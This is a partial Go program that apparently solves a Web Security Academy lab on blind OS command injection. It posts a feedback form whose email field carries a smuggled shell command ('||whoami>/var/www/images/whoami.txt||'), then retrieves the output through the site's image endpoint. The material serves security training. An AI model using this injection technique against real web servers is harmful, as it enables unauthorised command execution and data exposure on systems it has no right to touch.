...
func solve() error {
	baseUrl := "https://0a2400f503c8fde8c0b0f9c600240068.web-security-academy.net"
	feedbackUrl := baseUrl + "/feedback"
	feedbackSubmitUrl := baseUrl + "/feedback/submit"
	staticUrl := baseUrl + "/image?filename=whoami.txt"
	...
	_, body, err := get(client, feedbackUrl, nil)
	if err != nil {
		return err
	}
	...
	values.Set("email", "||whoami>/var/www/images/whoami.txt||")
	values.Set("subject", "Subject")
	values.Set("message", "Message")

	_, body, err = postForm(client, feedbackSubmitUrl, nil, values)
	if err != nil {
		return err
	}

	_, body, err = get(client, staticUrl, nil)
	if err != nil {
		return err
	}
